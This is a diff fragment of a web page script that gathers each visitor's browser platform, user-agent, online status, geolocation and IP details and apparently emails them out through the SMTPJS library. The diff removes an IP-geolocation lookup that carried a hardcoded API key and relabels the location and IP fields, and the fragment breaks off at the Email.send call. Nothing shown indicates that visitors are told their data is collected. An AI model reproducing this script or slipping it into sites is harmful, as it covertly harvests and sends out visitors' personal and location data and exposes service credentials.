@@ -301,11 +301,6 @@ window.intergramCustomizations = {
 <script src="https://smtpjs.com/v3/smtp.js"></script>
 <script>
 	
-$.getJSON('http://api.ipgeolocation.io/ipgeo?apiKey=37b5cfa9061c4deeb212a2884954fbdf', function(data) {
-        
-        var ipinfo = data;
-    });
-	
     var x = "";
 
 function getLocation() {
@@ -330,8 +325,8 @@ function getLocation() {
 	txt += "<p>Browser Online: " + navigator.onLine + "</p>";
 	txt += "<p>Platform: " + navigator.platform + "</p>";
 	txt += "<p>User-agent header: " + navigator.userAgent + "</p>";
-	txt += x;
-	txt += "<br> Ip Details:<br>" + ipinfo;
+	txt += "Location: " + x;
+	txt += "<br> Ip Details:<br>" + ipfromapi;
 
 	
     Email.send({
